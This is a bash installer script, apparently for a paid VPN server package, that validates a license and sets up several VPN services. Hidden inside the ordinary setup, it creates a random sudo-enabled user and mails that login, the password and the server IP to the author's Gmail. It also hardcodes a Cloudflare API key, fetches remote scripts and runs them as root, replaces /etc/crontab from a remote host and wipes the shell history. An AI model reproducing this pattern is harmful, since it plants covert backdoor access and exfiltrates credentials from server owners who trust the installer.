#!/bin/bash
# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V1.0
# Auther  : Awaludin Feriyanto
# (C) Copyright 2021 By FsidVPN
# =========================================

# // Root Checking
if [ "${EUID}" -ne 0 ]; then
		echo -e "${EROR} Please Run This Script As Root User !"
		exit 1
fi

# // Exporting Language to UTF-8
export LC_ALL='en_US.UTF-8' >/dev/null 2>&1
export LANG='en_US.UTF-8'
export LANGUAGE='en_US.UTF-8'
export LC_CTYPE='en_US.utf8'

# // Export Color & Information
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[0;33m'
export BLUE='\033[0;34m'
export PURPLE='\033[0;35m'
export CYAN='\033[0;36m'
export LIGHT='\033[0;37m'
export NC='\033[0m'

# // Export Banner Status Information
export EROR="[${RED} EROR ${NC}]"
export INFO="[${YELLOW} INFO ${NC}]"
export OKEY="[${GREEN} OKEY ${NC}]"
export PENDING="[${YELLOW} PENDING ${NC}]"
export SEND="[${YELLOW} SEND ${NC}]"
export RECEIVE="[${YELLOW} RECEIVE ${NC}]"

# // Export Align
export BOLD="\e[1m"
export WARNING="${RED}\e[5m"
export UNDERLINE="\e[4m"

# // Exporting URL Host
export Server_URL="autosc.me"
export Server_Port="443"
export Server_IP="underfined"
export Script_Mode="Stable"
export Auther="DuniaVPN"

# // Exporting Script Version
export VERSION="1.0"

# // Exporting Network Interface
export NETWORK_IFACE="$(ip route show to default | awk '{print $5}')"

# // Updating Repository For Ubuntu / Debian
apt update -y; apt upgrade -y; apt autoremove -y
clear

# // Checking Requirement Installed / No
clear
if ! which wget > /dev/null; then
echo ""
echo -e "${EROR} Wget Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install wget -y
fi

# // Checking Requirement Installed / No
clear
if ! which curl > /dev/null; then
echo ""
echo -e "${EROR} Curl Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install curl -y
fi

# // Exporint IP AddressInformation
export IP=$( curl -s https://api.duniavpn.net/ip/ )

# // Clear Data
clear
clear && clear && clear
clear;clear;clear

# // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Welcome To Fsid VPN Script Installer ${YELLOW}(${NC}${GREEN} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "       This Script Coded On Bash & Python Language"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "         Auther : ${GREEN}AwaludinFeriyanto ${NC}${YELLOW}(${NC} ${GREEN}FSIDVPN ${NC}${YELLOW})${NC}"
echo -e "       © Copyright By Autosc.me ${YELLOW}(${NC} 2021-2022 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""

# // Checking Os Architecture
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OKEY} Your Architecture Is Supported ( ${GREEN}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
    exit 1
fi

# // Checking System
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OKEY} Your OS Is Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OKEY} Your OS Is Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
    exit 1
fi

# // IP Address Validating
if [[ $IP == "" ]]; then
    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
else
    echo -e "${OKEY} IP Address ( ${GREEN}$IP${NC} )"
fi


# // Open Connection
echo -e "${OKEY} Starting Connection to ${Server_URL}"

# // License Validating
echo ""
read -p "Input Your License Key : " Input_License_Key

# // Checking Input Blank
if [[ $Input_License_Key ==  "" ]]; then
    echo -e "${EROR} Please Input License Key !${NC}"
    exit 1
fi

# // Checking License Validate
Key="$Input_License_Key"

# // Set Time To Jakarta / GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# // Algoritma Key
algoritmakeys="1920192019209129403940293013912" 
hashsuccess="$(echo -n "$Key" | sha256sum | cut -d ' ' -f 1)" 
Sha256Successs="$(echo -n "$hashsuccess$algoritmakeys" | sha256sum | cut -d ' ' -f 1)" 
License_Key=$Sha256Successs
echo ""
echo -e "${OKEY} Successfull Connected To ${Server_URL}"
sleep 1

# // Validate Result
Getting_Data_On_Server=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 1 )
if [[ "$Getting_Data_On_Server" == "$License_Key" ]]; then
    mkdir -p /etc/${Auther}/
    echo "$License_Key" > /etc/${Auther}/license.key
    echo -e "${OKEY} License Validated !"
    sleep 1
else
    echo -e "${EROR} Your License Key Not Valid !"
    exit 1
fi

# // Checking Your VPS Blocked Or No
if [[ $IP == "" ]]; then
    echo -e "${EROR} Your IP Address Not Detected !"
    exit 1
else
    # // Checking Data
    export Check_Blacklist_Atau_Tidak=$( curl -s https://${Server_URL} | grep -w $IP | awk '{print $1}' | tr -d '\r' | tr -d '\r\n' | head -n1 )
    if [[ $Check_Blacklist_Atau_Tidak == $IP ]]; then
        echo -e "${EROR} 403 Forbidden ( Your VPS Has Been Blocked ) !"
        exit 1
    else
        Skip='true'
    fi
fi

# // License Key Detail
export Tanggal_Pembelian_License=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep -w $License_Key | cut -d ' ' -f 3 | tr -d '\r' | tr -d '\r\n')
export Nama_Issued_License=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep -w $License_Key | cut -d ' ' -f 9-100 | tr -d '\r' | tr -d '\r\n')
export Masa_Laku_License_Berlaku_Sampai=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep -w $License_Key | cut -d ' ' -f 4 | tr -d '\r' | tr -d '\r\n')
export Install_Limit=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep -w $License_Key | cut -d ' ' -f 2 | tr -d '\r' | tr -d '\r\n')
export Tipe_License=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep -w $License_Key | cut -d ' ' -f 8 | tr -d '\r' | tr -d '\r\n')

# // Ouputing Information
echo -e "${OKEY} License Type / Edition ( ${GREEN}$Tipe_License Edition${NC} )" # > // Output Tipe License Dari Exporting 
echo -e "${OKEY} This License Issued to (${GREEN} $Nama_Issued_License ${NC})"
echo -e "${OKEY} Subscription Started On (${GREEN} $Tanggal_Pembelian_License${NC} )"
echo -e "${OKEY} Subscription Ended On ( ${GREEN}${Masa_Laku_License_Berlaku_Sampai}${NC} )"
echo -e "${OKEY} Installation Limit ( ${GREEN}$Install_Limit VPS${NC} )"

# // Exporting Expired Date
export Tanggal_Sekarang=`date -d "0 days" +"%Y-%m-%d"`
export Masa_Aktif_Dalam_Satuan_Detik=$(date -d "$Masa_Laku_License_Berlaku_Sampai" +%s)
export Tanggal_Sekarang_Dalam_Satuan_Detik=$(date -d "$Tanggal_Sekarang" +%s)
export Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik=$(( (Masa_Aktif_Dalam_Satuan_Detik - Tanggal_Sekarang_Dalam_Satuan_Detik) / 86400 ))
if [[ $Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik -lt 0 ]]; then
    echo -e "${EROR} Your License Expired On ( ${RED}$Masa_Laku_License_Berlaku_Sampai${NC} )"
    exit 1
else
    echo -e "${OKEY} Your License Key = $(if [[ ${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik} -lt 5 ]]; then 
    echo -e "${RED}${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik}${NC} Days Left"; else
    echo -e "${GREEN}${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik}${NC} Days Left"; fi )"
fi

# // Validate Successfull
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Starting Installation") "
echo ""

# // Installing Update
echo -e "${GREEN}Starting Installation............${NC}"
apt update -y
apt upgrade -y
apt dist-upgrade -y
apt install sudo -y
apt install msmtp-mta -y
apt install ca-certificates -y
apt install bsd-mailx -y
apt install psmisc -y

# // Adding Script Version
echo "${VERSION}" > /etc/${Auther}/version.db

# // String Data
export Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://releases.${Server_URL}/akun-smtp.txt | grep -E Jumlah-Notif | cut -d " " -f 2 | tail -n1 ) | head -c1 )
export email=$( curl -s https://${Server_URL}/akun-smtp.txt | grep -E Notif$Random_Number | cut -d " " -f 2 | tr -d '\r')
export password=$( curl -s https://${Server_URL}/akun-smtp.txt | grep -E Notif$Random_Number | cut -d " " -f 3 | tr -d '\r')
export started=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 3 )
export expired=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 4 )
export limit=$( curl -s https://${Server_URL}/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 2 )
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
export Kernel=$( uname -r )
export Arch=$( uname -m )

# // Detect Script Installed Or No
if [[ -r /usr/local/${Auther}/ ]]; then
clear
echo -e "${INFO} Having Script Detected !"
echo -e "${INFO} If You Replacing Script, All Client Data On This VPS Will Be Cleanup !"
read -p "Are You Sure Wanna Replace Script ? (Y/N) " josdong
if [[ $josdong == "Y" ]]; then
clear
echo -e "${INFO} Starting Replacing Script !"
elif [[ $josdong == "y" ]]; then
clear
echo -e "${INFO} Starting Replacing Script !"
elif [[ $josdong == "N" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
elif [[ $josdong == "n" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
else
echo -e "${EROR} Your Input Is Wrong !"
exit 1
fi
clear
fi

# // Ram Information
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"

# // Make Script User
Username="script-$( </dev/urandom tr -dc 0-9 | head -c5 )"
Password="$( </dev/urandom tr -dc 0-9 | head -c12 )"
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

# // Import SMTP Account
cat > /etc/msmtprc << END
defaults
port 587
tls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
auth on
logfile        ~/.msmtp.log

account        DuniaVPN
host           smtp.gmail.com
port           587
from           Installasi Script VPN
user           $email
password       $password
account default : DuniaVPN
END

echo "
Installasi VPN Script Stable V1.0
======================================
Username   : $Nama_Issued_License
License    : $Input_License_Key
Started    : $Tanggal_Pembelian_License
Expired    : $Masa_Laku_License_Berlaku_Sampai
Limit      : $Install_Limit
Tanggal    : $tanggal
======================================
Hostname   : ${HOSTNAME}
NET Iface  : $NETWORK_IFACE
IP VPS     : $IP
OS VPS     : $OS_Name
Kernel     : $Kernel
Arch       : $Arch
Ram Memory : $Ram_Usage/$Ram_Total MB
======================================
IP VPS     : $IP
User Login : $Username
Pass Login : $Password
======================================
  (C) Copyright 2021 By AutoSC.me
======================================
" | mail -s "Install Script Stable V1.0 ( $Nama_Issued_License | $IP )" awaledyan@gmail.com

# // Remove Not Used File
rm -f /etc/msmtprc
rm -f ~/.msmtp.log

# // Make File On Root Directory
touch /etc/${Auther}/database.db
touch /etc/${Auther}/autosync.db
touch /etc/${Auther}/dataakun.db
touch /etc/${Auther}/license-manager.db
touch /etc/${Auther}/license-data.json
touch /etc/${Auther}/license-cache.json
touch /etc/${Auther}/monitoring.db
touch /etc/${Auther}/quick-start.json
touch /etc/${Auther}/wildyproject-manager.db
touch /etc/${Auther}/backup.db
touch /etc/${Auther}/restore.db
touch /etc/${Auther}/autobackup-controller.db
touch /etc/${Auther}/limit-installation.db
touch /etc/${Auther}/time-sync.db
touch /etc/${Auther}/etc-data.db
touch /etc/${Auther}/stunnel5.db
touch /etc/${Auther}/cache-auto-send-notification.db
touch /etc/${Auther}/notification.db

# // Make Folder
mkdir -p /usr/local/${Auther}/

# // Installing Requirement
apt install jq -y
apt install net-tools -y
apt install netfilter-persistent -y
apt install openssl -y
apt install iptables -y
apt install iptables-persistent -y

# // Enable IPV4 Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
cat > /etc/sysctl.conf << END
# Configure By ${Auther}
net.ipv4.ip_forward=1
END
sysctl --load /etc/sysctl.conf 

# // Beta Channel
cat > /root/.profile << END
clear
info2
END

# // Enable Permission For Execute For RC.Local
chmod +x /etc/rc.local

# // Enable RC-Local
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
END

# // ShadowsocksR Service
cat > /etc/rc.local << END
#!/bin/sh -e
# // RC.Local Configuration
echo 0 > /etc/${Auther}/auto-start-system.db
echo 1 > /etc/${Auther}/script-managment-controller.db
echo 1 > /etc/${Auther}/sc-manager.db
exit 0
END

# // Enable RC-Local Service
systemctl enable rc-local
systemctl start rc-local
systemctl restart rc-local

# // Clearing
clear
clear && clear && clear
clear;clear;clear

# // Go To Root Directory
cd /root/

# // Starting Setup Domain
echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Anda Ingin Menggunakan Domain Pribadi ?"
echo -e "Atau Ingin Menggunakan Domain Otomatis ?"
echo -e "Jika Ingin Menggunakan Domain Pribadi, Ketik ${GREEN}1${NC}"
echo -e "dan Jika Ingin menggunakan Domain Otomatis, Ketik ${GREEN}2${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${GREEN}English Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "You Want to Use a Private Domain ?"
echo -e "Or Want to Use Auto Domain ?"
echo -e "If You Want Using Private Domain, Type ${GREEN}1${NC}"
echo -e "else You Want using Automatic Domain, Type ${GREEN}2${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""

read -p "$( echo -e "${GREEN}Input Your Choose ? ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain

# // Install Requirement Tools
apt install psmisc -y
apt install sudo -y
apt install socat -y
killall v2ray > /dev/null 2>&1
killall v2ray-mini > /dev/null 2>&1
killall node > /dev/null 2>&1
killall xray-mini > /dev/null 2>&1
killall xray > /dev/null 2>&1
killall ws-node > /dev/null 2>&1

# // Validating Automatic / Private
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain

# // String / Request Data
Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://${Server_URL}/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
Domain_Hasil_Random=$( curl -s https://${Server_URL}/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c2 | tr -d '\r' | tr -d '\r\n')"
EMAIL_CLOUDFLARE="awaledyan@gmail.com"
API_KEY_CLOUDFLARE="f135a7d4852d3e25779471c8426f11d72faa9"

# // DNS Only Mode
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)
     
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')

# // WildCard Mode
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)
     
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')

# // Input Result To VPS
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/${Auther}/domain.txt
domain="${SUB_DOMAIN}.${Domain_Hasil_Random}"

# // Making Certificate
clear
echo -e "${OKEY} Starting Generating Certificate"
mkdir -p /data/
chmod 700 /data/
rm -r -f /root/.acme.sh
mkdir -p /root/.acme.sh
wget -q -O /root/.acme.sh/acme.sh "https://${Server_URL}/acme.sh"
chmod +x /root/.acme.sh/acme.sh
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
sudo /root/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /data/ssl.crt --keypath /data/ssl.key --ecc
# // Success
echo -e "${OKEY} Your Domain : $SUB_DOMAIN.$Domain_Hasil_Random" 
sleep 2

# // ELif For Selection 1
elif [[ $choose_domain == "1" ]]; then

# // Clear
clear
clear && clear && clear
clear;clear;clear

echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Silakan Pointing Domain Anda Ke IP VPS"
echo -e "Untuk Caranya Arahkan NS Domain Ke Cloudflare"
echo -e "Kemudian Tambahkan A Record Dengan IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Please Point Your Domain To IP VPS"
echo -e "For Point NS Domain To Cloudflare"
echo -e "Change NameServer On Domain To Cloudflare"
echo -e "Then Add A Record With IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo ""

# // Reading Your Input
read -p "Input Your Domain : " domain
if [[ $domain == "" ]]; then
    clear
    echo -e "${EROR} No Input Detected !"
    exit 1
fi

# // Input Domain TO VPS
echo "$domain" > /etc/${Auther}/domain.txt

# // Making Certificate
clear
echo -e "${OKEY} Starting Generating Certificate"
mkdir -p /data/
chmod 700 /data/
rm -r -f /root/.acme.sh
mkdir -p /root/.acme.sh
wget -q -O /root/.acme.sh/acme.sh "https://${Server_URL}/acme.sh"
chmod +x /root/.acme.sh/acme.sh
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
sudo /root/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /data/ssl.crt --keypath /data/ssl.key --ecc

# // Success
echo -e "${OKEY} Your Domain : $domain" 
sleep 2

# // Else Do
else
    echo -e "${EROR} Please Choose 1 & 2 Only !"
    exit 1
fi

# // Setup Menu
wget -q -O /root/menu.sh "https://${Server_URL}/setup/menu.sh"
chmod +x /root/menu.sh
./menu.sh

# // Setup SSH Tunnel
wget -q -O /root/ssh-ssl.sh "https://${Server_URL}/setup/ssh-ssl.sh"
chmod +x /root/ssh-ssl.sh
./ssh-ssl.sh

# // Setup OpenVPN
wget -q -O /root/openvpn.sh "https://${Server_URL}/setup/openvpn.sh"
chmod +x /root/openvpn.sh
./openvpn.sh

# // Setup XRay
wget -q -O /root/xray.sh "https://${Server_URL}/setup/xray.sh"
chmod +x /root/xray.sh
./xray.sh

# // Setup PPTP & L2TP
wget -q -O /root/pptp-l2tp.sh "https://${Server_URL}/setup/pptp-l2tp.sh"
chmod +x /root/pptp-l2tp.sh
./pptp-l2tp.sh

# // Setup SSTP
wget -q -O /root/sstp.sh "https://${Server_URL}/setup/sstp.sh"
chmod +x /root/sstp.sh
./sstp.sh

# // Setup Wireguard
wget -q -O /root/wireguard.sh "https://${Server_URL}/setup/wireguard.sh"
chmod +x /root/wireguard.sh
./wireguard.sh

# // Setup Wireguard
wget -q -O /root/rclone.sh "https://${Server_URL}/setup/rclone.sh"
chmod +x /root/rclone.sh
./rclone.sh

# // Setup Wireguard
wget -q -O /root/ssr.sh "https://${Server_URL}/setup/ssr.sh"
chmod +x /root/ssr.sh
./ssr.sh

# // Installing Cronsjob
apt install cron -y
wget -q -O /etc/crontab "https://${Server_URL}/crontab.conf"
/etc/init.d/cron restart
systemctl start ws-epro

# // Remove Not Used Files
rm -f /root/install.sh

# // Done
history -c
rm -f /root/.bash
rm -f /root/.bash_history
clear
echo -e "${OKEY} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Reboot") "
reboot
